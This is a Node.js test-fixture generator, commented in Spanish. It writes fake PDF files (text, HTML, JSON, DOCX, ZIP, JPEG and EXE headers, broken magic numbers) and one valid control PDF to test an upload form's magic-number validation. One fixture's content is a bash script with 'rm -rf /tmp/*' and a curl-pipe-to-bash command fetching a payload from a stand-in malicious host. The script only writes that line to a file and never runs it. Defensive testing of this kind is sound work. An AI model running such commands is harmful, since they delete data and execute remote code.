// generarPdfsfalsos.js - Validación de Números Mágicos
// Ejecutar con: node generarPdfsfalsos.js

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// Fix para __dirname en ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const pruebasPdfFalsos = [
    {
        nombreArchivo: "falso_txt_como_pdf.pdf",
        contenido: "Este es solo texto plano disfrazado como PDF. No tiene números mágicos correctos.",
        descripcion: "Archivo de texto plano con extensión PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_html_como_pdf.pdf",
        contenido: `<!DOCTYPE html>
<html>
<head><title>PDF Falso</title></head>
<body>
<h1>Esto es HTML pretendiendo ser un PDF</h1>
<p>Debería ser bloqueado por validación de números mágicos</p>
</body>
</html>`,
        descripcion: "Archivo HTML con extensión PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_json_como_pdf.pdf",
        contenido: JSON.stringify({
            "tipo": "pdf_falso",
            "contenido": "Estos son datos JSON disfrazados como PDF",
            "malicioso": true,
            "deberia_ser_bloqueado": true
        }, null, 2),
        descripcion: "Archivo JSON con extensión PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_docx_como_pdf.pdf",
        contenido: "PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00", // Bytes mágicos DOCX
        descripcion: "Archivo DOCX (con bytes mágicos DOCX) renombrado como PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_jpeg_como_pdf.pdf",
        contenido: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), // Bytes mágicos JPEG
        descripcion: "Archivo JPEG (con bytes mágicos JPEG) renombrado como PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_zip_como_pdf.pdf",
        contenido: "PK\x03\x04", // Bytes mágicos ZIP
        descripcion: "Archivo ZIP (con bytes mágicos ZIP) renombrado como PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_vacio_como_pdf.pdf",
        contenido: "",
        descripcion: "Archivo completamente vacío con extensión PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos + tamaño muy pequeño"
    },
    {
        nombreArchivo: "falso_magico_parcial.pdf",
        contenido: "%PD", // Número mágico PDF incompleto
        descripcion: "Archivo con número mágico PDF incompleto",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_mayusculas_incorrectas.pdf",
        contenido: "%pdf-1.4\nAlgún contenido", // 'pdf' en minúsculas en lugar de 'PDF'
        descripcion: "Archivo con mayúsculas incorrectas en número mágico",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_casi_magico_pdf.pdf",
        contenido: "PDF-1.4\nSin signo de porcentaje", // Falta % al inicio
        descripcion: "Archivo sin signo de porcentaje en número mágico",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_script_como_pdf.pdf",
        contenido: `#!/bin/bash
echo "Este es un script bash disfrazado como PDF"
rm -rf /tmp/*
curl http://sitio-malicioso.com/payload.sh | bash`,
        descripcion: "Script bash con extensión PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    },
    {
        nombreArchivo: "falso_exe_como_pdf.pdf",
        contenido: Buffer.from([0x4D, 0x5A]), // Bytes mágicos Windows EXE (MZ)
        descripcion: "Ejecutable Windows con extensión PDF",
        resultadoEsperado: "BLOQUEAR - Números mágicos inválidos"
    }
];

// También crear un PDF válido para comparación
const contenidoPdfValido = `%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(PDF válido para comparación) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000189 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
290
%%EOF`;

function generarPdfsfalsos() {
    const directorioTest = path.join(__dirname, 'pruebas_pdf_falsos');

    if (!fs.existsSync(directorioTest)) {
        fs.mkdirSync(directorioTest, { recursive: true });
    }

    console.log('Generador de Pruebas de Validación de Números Mágicos');
    console.log('===================================================');
    console.log(`Directorio de salida: ${directorioTest}\n`);

    let contadorGenerados = 0;

    console.log('Generando archivos PDF falsos para pruebas de números mágicos...\n');

    pruebasPdfFalsos.forEach(prueba => {
        try {
            const rutaArchivo = path.join(directorioTest, prueba.nombreArchivo);

            if (Buffer.isBuffer(prueba.contenido)) {
                fs.writeFileSync(rutaArchivo, prueba.contenido);
            } else {
                fs.writeFileSync(rutaArchivo, prueba.contenido, 'utf8');
            }

            console.log(`[GENERADO] ${prueba.nombreArchivo}`);
            console.log(`  Descripción: ${prueba.descripcion}`);
            console.log(`  Esperado: ${prueba.resultadoEsperado}`);
            console.log('');

            contadorGenerados++;
        } catch (error) {
            console.error(`ERROR generando ${prueba.nombreArchivo}: ${error.message}`);
        }
    });

    // Generar PDF válido para comparación
    try {
        const rutaPdfValido = path.join(directorioTest, 'pdf_valido_control.pdf');
        fs.writeFileSync(rutaPdfValido, contenidoPdfValido, 'binary');
        console.log(`[GENERADO] pdf_valido_control.pdf`);
        console.log(`  Descripción: Archivo PDF válido para comparación`);
        console.log(`  Esperado: ACEPTAR - Debería pasar todas las validaciones`);
        console.log('');
        contadorGenerados++;
    } catch (error) {
        console.error('ERROR generando PDF válido de control:', error.message);
    }

    // Resumen
    console.log('='.repeat(50));
    console.log('RESUMEN DE PRUEBAS DE NÚMEROS MÁGICOS');
    console.log('='.repeat(50));
    console.log(`Archivos generados: ${contadorGenerados}`);
    console.log(`Ubicación: ${directorioTest}`);

    console.log('\nINSTRUCCIONES DE PRUEBA:');
    console.log('========================');
    console.log('1. Iniciar tu servidor de desarrollo: pnpm dev');
    console.log('2. Navegar a tu formulario de subida de archivos');
    console.log('3. Probar cada archivo en el siguiente orden:');
    console.log('');

    console.log('PRUEBA DE CONTROL (debería PASAR):');
    console.log('- pdf_valido_control.pdf → Debería ser aceptado');
    console.log('');

    console.log('PRUEBAS DE NÚMEROS MÁGICOS (todas deberían FALLAR):');
    pruebasPdfFalsos.forEach(prueba => {
        console.log(`- ${prueba.nombreArchivo} → Debería ser bloqueado`);
    });

    console.log('\nMENSAJES DE ERROR ESPERADOS:');
    console.log('- "El archivo no es un PDF válido (estructura incorrecta)"');
    console.log('- "Error al leer la estructura del archivo"');
    console.log('');

    console.log('CONSEJOS DE DEPURACIÓN:');
    console.log('- Revisar consola del navegador para logs detallados de validación');
    console.log('- Revisar consola del servidor para mensajes de validación backend');
    console.log('- Si un archivo falso es aceptado, la validación de números mágicos tiene problemas');
    console.log('- Todos los archivos falsos deberían ser rechazados antes del análisis de contenido');

    return { directorioTest, contadorGenerados };
}

// Función utilitaria para inspeccionar números mágicos de archivos generados
function inspeccionarNumerosMagicos() {
    const directorioTest = path.join(__dirname, 'pruebas_pdf_falsos');

    if (!fs.existsSync(directorioTest)) {
        console.log('Directorio de prueba no encontrado. Ejecutar generación primero.');
        return;
    }

    console.log('\nINSPECCIÓN DE NÚMEROS MÁGICOS:');
    console.log('==============================');

    const archivos = fs.readdirSync(directorioTest).filter(f => f.endsWith('.pdf'));

    archivos.forEach(nombreArchivo => {
        try {
            const rutaArchivo = path.join(directorioTest, nombreArchivo);
            const buffer = fs.readFileSync(rutaArchivo);
            const primeros8Bytes = buffer.slice(0, 8);

            console.log(`${nombreArchivo}:`);
            console.log(`  Primeros 8 bytes (hex): ${primeros8Bytes.toString('hex')}`);
            console.log(`  Primeros 8 bytes (ascii): ${primeros8Bytes.toString('ascii').replace(/[^\x20-\x7E]/g, '.')}`);
            console.log(`  Esperado para PDF: 25 50 44 46 (%PDF)`);
            console.log(`  Número mágico PDF válido: ${primeros8Bytes[0] === 0x25 && primeros8Bytes[1] === 0x50 && primeros8Bytes[2] === 0x44 && primeros8Bytes[3] === 0x46}`);
            console.log('');
        } catch (error) {
            console.error(`Error inspeccionando ${nombreArchivo}: ${error.message}`);
        }
    });
}

// Ejecutar si se ejecuta directamente
try {
    const resultado = generarPdfsfalsos();
    console.log(`\nGeneración de PDFs falsos completada exitosamente.`);
    console.log(`Total de archivos: ${resultado.contadorGenerados}`);

    // También ejecutar inspección de números mágicos
    inspeccionarNumerosMagicos();

} catch (error) {
    console.error('ERROR FATAL:', error.message);
    console.error(error.stack);
    process.exit(1);
}